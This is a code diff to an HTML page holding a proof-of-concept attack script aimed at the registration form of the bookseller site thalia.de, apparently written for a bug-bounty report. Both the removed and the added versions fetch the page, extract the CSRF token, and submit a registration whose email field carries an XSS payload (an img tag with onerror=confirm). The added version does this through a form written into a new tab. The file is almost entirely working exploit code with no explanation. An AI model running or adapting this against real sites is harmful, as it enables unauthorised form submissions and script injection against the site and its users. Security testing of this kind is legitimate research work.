@@ -5,48 +5,44 @@
     </head>
     <body>
         <script>
-            let csrfToken; // Global variable to store the CSRF token
-
 // Step 1: Send a GET request to obtain the CSRF token
-fetch('https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true')
-  .then(response => response.text())
-  .then(data => {
-    const regex = /name="&#95;csrf" value="([^"]+)"/;
-    const match = data.match(regex);
-    if (match && match[1]) {
-      csrfToken = match[1];
-      console.log('CSRF token:', csrfToken);
-      
-      // Step 2: Prepare and send the POST request
-      const formData = new FormData();
-      formData.append('email', 'nb1b3k-ywh-f72fb34c3a37a3d7@yeswehack.ninja\'"><img src=x onshit=confirm(1) onerror=confirm`1`>asd</h1>');
-      formData.append('passwort', 'Test@123');
-      formData.append('geburtstagTag', '01');
-      formData.append('geburtstagMonat', '01');
-      formData.append('geburtstagJahr', '1991');
-      formData.append('agb', 'true');
-      formData.append('&#95;csrf', csrfToken);
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true", true);
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    // Extract CSRF token from the response
+    var parser = new DOMParser();
+    var htmlDoc = parser.parseFromString(xhr.responseText, 'text/html');
+    var csrfToken = htmlDoc.querySelector('nutzer-registrierung').getAttribute('csrf-token');
+    console.log('CSRF token:', csrfToken);
 
-      fetch('https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true', {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.text())
-      .then(result => {
-        console.log('POST request response:', result);
-        // Handle the response as needed
-      })
-      .catch(error => {
-        console.error('Error sending POST request:', error);
-      });
-    } else {
-      console.error('CSRF token not found in the response');
+    // Step 2: Open a new tab and construct the form with multipart data
+    var newTab = window.open('about:blank');
+    if (newTab) {
+      var formHTML = `
+        <form id="csrfForm" method="POST" action="https://www.thalia.de/registrierung?timestamp=1693412108304&headless=true" enctype="multipart/form-data" target="_blank">
+          <textarea name="email">nb1b3k-ywh-f72fb34c3a37a3d7@yeswehack.ninja'"><img src=x onshit=confirm(1) onerror=confirm\`1\`>asd&lt;/h1&gt;</textarea>
+          <textarea name="passwort">Test@123</textarea>
+          <textarea name="geburtstagTag">01</textarea>
+          <textarea name="geburtstagMonat">01</textarea>
+          <textarea name="geburtstagJahr">1991</textarea>
+          <textarea name="agb">true</textarea>
+          <textarea name="_csrf">${csrfToken}</textarea>
+          <button type="submit">Submit</button>
+        </form>
+      `;
+
+      newTab.document.write(formHTML);
+
+      // Trigger the form submission programmatically
+      var form = newTab.document.getElementById("csrfForm");
+      if (form) {
+        form.submit();
+      }
     }
-  })
-  .catch(error => {
-    console.error('Error obtaining CSRF token:', error);
-  });
-
+  }
+};
+xhr.send();
         </script>
     </body>
 </html>
